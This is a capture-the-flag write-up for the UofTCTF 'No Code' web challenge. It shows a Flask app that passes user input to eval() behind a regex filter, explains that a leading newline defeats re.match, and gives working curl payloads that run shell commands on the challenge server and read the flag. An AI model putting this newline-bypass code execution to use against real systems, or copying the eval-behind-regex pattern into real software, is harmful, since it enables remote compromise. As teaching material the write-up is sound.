# No Code [148 Solves]

## Description

> I made a web app that lets you run any code you want. Just kidding!
>
> Author: SteakEnthusiast
>
> `https://uoftctf-no-code.chals.io/`
>
> Attachments: app.py

## Source Code

app.py

```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)


@app.route("/execute", methods=["POST"])
def execute_code():
    code = request.form.get("code", "")
    print(code)
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

## Solution

The regular expression `.*[\x20-\x7E]+.*` restricts most ASCII characters.
However, since `re.match` is used, we can bypass this with a newline.

Tested in Python console:

```python
>>> re.match(".*[\x20-\x7E]+.*", "foobar")
<re.Match object; span=(0, 6), match='foobar'>
>>> re.match(".*[\x20-\x7E]+.*", "\nfoobar")
>>>
```

Exploit:

```console
$ curl https://uoftctf-no-code.chals.io/execute -d code="%0a__import__('subprocess').run('id', shell=True, capture_output=True).stdout.decode()"
{"output":"uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)\n"}

$ curl https://uoftctf-no-code.chals.io/execute -d code="%0a__import__('subprocess').run('ls', shell=True, capture_output=True).stdout.decode()"
{"output":"app.py\nflag.txt\nrequirements.txt\n"}

$ curl https://uoftctf-no-code.chals.io/execute -d code="%0a__import__('subprocess').run('cat flag.txt', shell=True, capture_output=True).stdout.decode()"
{"output":"uoftctf{r3g3x_3p1c_f41L_XDDD}"}
```

## Flag

uoftctf{r3g3x_3p1c_f41L_XDDD}

## References

- [re — Regular expression operations — Python 3.12.1 documentation](https://docs.python.org/3.12/library/re.html#re.match)
- [Python RE Bypass Technique](https://www.secjuice.com/python-re-match-bypass-technique/)
